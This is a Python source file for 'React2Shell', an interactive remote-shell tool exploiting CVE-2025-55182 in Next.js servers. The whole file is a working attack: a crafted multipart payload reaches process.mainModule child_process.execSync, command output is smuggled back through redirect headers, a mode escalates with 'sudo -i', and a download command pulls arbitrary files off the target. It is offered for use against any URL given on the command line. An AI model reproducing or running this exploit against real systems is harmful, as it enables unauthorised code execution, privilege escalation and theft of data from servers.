#!/usr/bin/env python3
"""
React2Shell - CVE-2025-55182 Exploitation Suite
Provides better command execution and output handling with root support
Standalone Version - No external dependencies
"""
import sys
import os
import readline
import base64
import re
import random
import string
import time
from datetime import datetime
from urllib.parse import urlparse, unquote

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

class EnhancedShell:
    def __init__(self, target_url):
        self.target = target_url
        self.history_file = ".shell_history"
        self.root_mode = False
        self.current_dir = None
        self.session = requests.Session()
        self.session.verify = False
        self.setup_readline()
        
    def setup_readline(self):
        """Setup command history"""
        try:
            readline.read_history_file(self.history_file)
        except FileNotFoundError:
            pass
        readline.set_history_length(1000)
    
    def save_history(self):
        """Save command history"""
        readline.write_history_file(self.history_file)
        
    def generate_junk_data(self, size_bytes):
        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
        return param_name, junk

    def build_payload(self, cmd):
        """Construct the CVE-2025-55182 Multipart Payload"""
        boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
        cmd_escaped = cmd.replace("'", "\\'")
        
        # Core RCE Logic
        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{cmd_escaped}',{{'timeout':5000}}).toString('base64');"
            f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )

        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )

        parts = []
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
        )
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
        )
        parts.append(
            f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
        )
        parts.append("------WebKitFormBoundaryx8jO2oVc6SWP3Sad--")

        body = "".join(parts)
        content_type = f"multipart/form-data; boundary={boundary}"
        return body, content_type
    
    def execute_command(self, command, update_cwd=False):
        """Execute command via HTTP Request"""
        
        # Prepare command with CWD and Root handling
        cmd_with_dir = command
        if self.current_dir:
            cmd_with_dir = f"cd {self.current_dir} && {command}"
            
        if self.root_mode:
            # Base64 Pipe Strategy
            cmd_b64 = base64.b64encode(cmd_with_dir.encode()).decode()
            final_cmd = f'echo {cmd_b64} | base64 -d | sudo -i 2>&1 || true'
        else:
            final_cmd = f"({cmd_with_dir}) 2>&1 || true"
        
        # Build Payload
        body, content_type = self.build_payload(final_cmd)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Next-Action": "x",
            "X-Nextjs-Request-Id": "b5dce965",
            "Content-Type": content_type,
            "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
        }
        
        try:
            # Send Request
            response = self.session.post(
                self.target,
                headers=headers,
                data=body,
                timeout=15,
                allow_redirects=False
            )
            
            # Parse Output using Regex
            # 1. Check X-Action-Redirect header
            redirect_header = response.headers.get("X-Action-Redirect", "")
            match = re.search(r'.*/login\?a=(.*?)(?:;|$)', redirect_header)
            
            if not match:
                # 2. Check Location header
                location_header = response.headers.get("Location", "")
                match = re.search(r'login\?a=(.*?)(?:;|$)', location_header)
                
            if match:
                output_b64 = match.group(1)
                try:
                    decoded = base64.b64decode(unquote(output_b64)).decode('utf-8', errors='ignore')
                    return decoded.strip()
                except Exception as e:
                    return f"{RED}[-] Failed to decode output: {e}{RESET}"
            else:
                return f"{YELLOW}[!] No output in response (Status: {response.status_code}){RESET}"
                
        except requests.exceptions.Timeout:
            return f"{RED}[-] Request timed out{RESET}"
        except Exception as e:
            return f"{RED}[-] Request error: {e}{RESET}"

    def print_banner(self):
        """Print shell banner"""
        # Fixed width of 60 for inner content
        print(f"{BOLD}{CYAN}╔{'═' * 60}╗{RESET}")
        
        # Title centering (Content 31 chars)
        # 60 - 31 = 29 spaces -> 14 left, 15 right
        print(f"{BOLD}{CYAN}║{RESET}{' ' * 14}{BOLD}{GREEN}React2Shell - Next.js RCE Shell{RESET}{' ' * 15}{BOLD}{CYAN}║{RESET}")
        
        # Target line (Prefix 10 chars, Suffix 2 chars -> 48 chars for target)
        # Using slice to prevent overflow breaking layout
        target_display = (self.target[:45] + '...') if len(self.target) > 48 else self.target
        print(f"{BOLD}{CYAN}║{RESET}  {YELLOW}Target:{RESET} {target_display:<48}  {BOLD}{CYAN}║{RESET}")
        
        # Root Mode line (Prefix 13 chars, Suffix 2 chars -> 45 chars for status)
        status = 'ON' if self.root_mode else 'OFF'
        print(f"{BOLD}{CYAN}║{RESET}  {YELLOW}Root Mode:{RESET} {status:<45}  {BOLD}{CYAN}║{RESET}")
        
        # Type line (Prefix 36 chars. 60 - 36 = 24 spaces padding)
        print(f"{BOLD}{CYAN}║{RESET}  {MAGENTA}Type:{RESET} Standalone (No Dependencies){' ' * 24}{BOLD}{CYAN}║{RESET}")
        
        print(f"{BOLD}{CYAN}╚{'═' * 60}╝{RESET}")
        print(f"\n{BOLD}Commands:{RESET}")
        print(f"  {GREEN}.root{RESET}     - Toggle root mode (sudo -i)")
        print(f"  {GREEN}.save{RESET}     - Save output to file")
        print(f"  {GREEN}.download{RESET} - Download file from target")
        print(f"  {GREEN}.exit{RESET}     - Exit shell")
        print(f"  {GREEN}.help{RESET}     - Show this help\n")
    
    def toggle_root_mode(self):
        """Toggle root mode"""
        self.root_mode = not self.root_mode
        status = f"{GREEN}ENABLED{RESET}" if self.root_mode else f"{RED}DISABLED{RESET}"
        print(f"{YELLOW}[*]{RESET} Root mode {status}")
    
    def save_output(self, output, filename=None):
        """Save output to file"""
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"output_{timestamp}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(output)
            print(f"{GREEN}[+]{RESET} Output saved to: {os.path.abspath(filename)}")
        except Exception as e:
            print(f"{RED}[-]{RESET} Error saving file: {e}")
    
    def download_file(self, remote_path, local_path=None):
        """Download file from target used base64 encoding"""
        if not local_path:
            local_path = f"downloaded/{os.path.basename(remote_path)}"
        
        os.makedirs(os.path.dirname(os.path.abspath(local_path)), exist_ok=True)
        
        # Read file via base64 to handle binary data
        print(f"{YELLOW}[*]{RESET} Downloading {remote_path} (via base64)...")
        # -w0 to avoid newlines breaking things
        b64_output = self.execute_command(f"base64 -w0 {remote_path}")
        
        if b64_output and "No output" not in b64_output:
            try:
                import base64
                # Clean up any whitespace/newlines that might have snuck in (though filter should catch them)
                clean_b64 = b64_output.replace('\n', '').replace('\r', '').strip()
                file_data = base64.b64decode(clean_b64)
                
                with open(local_path, 'wb') as f:
                    f.write(file_data)
                print(f"{GREEN}[+]{RESET} Downloaded to: {os.path.abspath(local_path)}")
                print(f"{GREEN}[+]{RESET} Size: {len(file_data)} bytes")
            except Exception as e:
                print(f"{RED}[-]{RESET} Failed to decode base64 data: {str(e)}")
                # Save raw output just in case
                with open(local_path + ".b64", 'w') as f:
                    f.write(b64_output)
                print(f"{YELLOW}[*]{RESET} Raw base64 saved to {local_path}.b64 for analysis")
        else:
            print(f"{RED}[-]{RESET} Failed to download file (empty or error)")

    def update_working_directory(self):
        """Initialize or update working directory"""
        cwd = self.execute_command("pwd")
        if cwd and "/" in cwd:
            self.current_dir = cwd.split('\n')[0].strip()

    def handle_cd(self, path):
        """Handle cd command specially"""
        # Formulate a check command: cd <dest> && pwd
        check_cmd = f"cd {path} && pwd"
        output = self.execute_command(check_cmd)
        
        if output and output.startswith("/"):
            new_dir = output.split('\n')[0].strip()
            self.current_dir = new_dir
            # Don't print pwd output, just silent success like real cd
        else:
            print(output or f"{RED}[-]{RESET} Directory not found")

    def run(self):
        """Main shell loop"""
        self.print_banner()
        
        # Initial CWD fetch
        print(f"{YELLOW}[*]{RESET} Initializing shell...")
        self.update_working_directory()
        
        last_output = ""
        
        try:
            while True:
                try:
                    # Dynamic Prompt
                    prompt_user = f"{BOLD}{RED}root{RESET}" if self.root_mode else f"{BOLD}{GREEN}ubuntu{RESET}"
                    prompt_dir = f"{BOLD}{BLUE}{self.current_dir or '~'}{RESET}"
                    # Simple hostname since we don't scan for it every time
                    prompt = f"{prompt_user}@{BOLD}{CYAN}target{RESET}:{prompt_dir}$ "
                    
                    command = input(prompt).strip()
                    
                    if not command:
                        continue
                    
                    # Handle special commands
                    if command == ".exit":
                        break
                    elif command == ".root":
                        self.toggle_root_mode()
                        # Re-fetch CWD for new user context
                        self.current_dir = None 
                        self.update_working_directory()
                        continue
                    elif command == ".help":
                        self.print_banner()
                        continue
                    elif command == ".save":
                        if last_output:
                            self.save_output(last_output)
                        else:
                            print(f"{RED}[-]{RESET} No output to save")
                        continue
                    elif command.split()[0] in [".download", ".dl"]:
                        parts = command.split()
                        if len(parts) < 2:
                            print(f"{YELLOW}[!] Usage: .download <remote_file> [local_path]{RESET}")
                            continue
                        remote_path = parts[1]
                        local_path = parts[2] if len(parts) > 2 else None
                        self.download_file(remote_path, local_path)
                        continue
                    elif command.strip().startswith("cd "):
                        path = command.strip().split(" ", 1)[1]
                        self.handle_cd(path)
                        continue
                    
                    # Execute command
                    output = self.execute_command(command)
                    last_output = output
                    
                    if output:
                        print(output)
                    
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}[!]{RESET} Use .exit to quit")
                    continue
                except Exception as e:
                    print(f"{RED}[-]{RESET} Error: {str(e)}")
        
        finally:
            self.save_history()
            print(f"\n{GREEN}[+]{RESET} Shell session ended")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="React2Shell - Standalone Next.js RCE Shell")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://example.com/)")
    
    args = parser.parse_args()
    
    shell = EnhancedShell(args.url)
    shell.run()
